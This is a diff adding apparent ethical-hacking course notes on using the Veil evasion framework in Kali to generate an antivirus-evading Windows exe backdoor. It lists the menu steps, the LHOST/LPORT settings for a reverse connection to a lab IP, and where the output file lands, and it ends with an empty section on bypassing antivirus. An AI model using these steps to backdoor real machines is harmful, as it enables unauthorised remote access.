@@ -34,7 +34,9 @@ IN MAIN MENU :
 2. $ list 
    # Two are available : evasion and ordnance
    # We are going to deal evasions to create backdoors
+
 3. $ use 1 # because 1 is evasion here
+
    # Now we have got around 41 payloads avail , with that we can create backdoor
 4. $ list # now list evasion
 5. It lists payloads 
@@ -43,5 +45,54 @@ IN MAIN MENU :
          1st is program type
          2nd is Session type
          3rd is Connection type -> Bind and reverse
-7. 
 
+--------------------------------------------------------------------
+
+93. Creating First Backdoor
+***
+1. NOW WITHIN THE DASHBOARD WE ARE LISTING THE evasion
+
+2. IN THAT :
+   $ use 14 # for example and 14 has lot of setups available
+3. It contains the details of that 14th payload
+4. Now you can see the required options
+
+NOTE !!! : THESE TWO OPTIONS ARE MANDATORY TO SET
+5. $ set LMOST 10.0.2.15 # my IP in NAT network and this varies according to the network
+6. $ set LPORT 8080 # Now we set port from 80 to 8080
+
+7. $ options # you can see the changes that we have done
+
+8. OTHER THAN THESE OPTIONS WE CAN ALSO SET
+
+9. BUT FOR NOW WE ARE READY TO CREATE OUR FIRST BACKDOOR
+
+10. TO GENERATE BACKDOOR : 
+    $ generate
+
+11. IT asks for the base name for our exe file and you can enter a name and hit enter
+
+12. NOW IT GENERATES BACKDOOR
+
+13. It also says the locations for the created backdoor
+
+14. NOW HIT ANY KEY ON THAT LOCATION DASHBOARD AND IT WILL BRING BACK TO OUR HOME DASHBOARD
+
+15. NOW TRY TO FIND THE FILE USING YOUR FILE MANAGER GUI or ROOT
+
+16. It is in usr/ of root
+    usr/share/veil-output/compiled/file_name.exe
+
+17. Now if we run this in our Windows machine it will create a vector/session by that we can connect to the device
+ using kali linux
+
+-------------------------------------------------------------------------
+
+94. ByPassing AntiVirus Solutions
+***
+
+1. 
+
+
+
+   
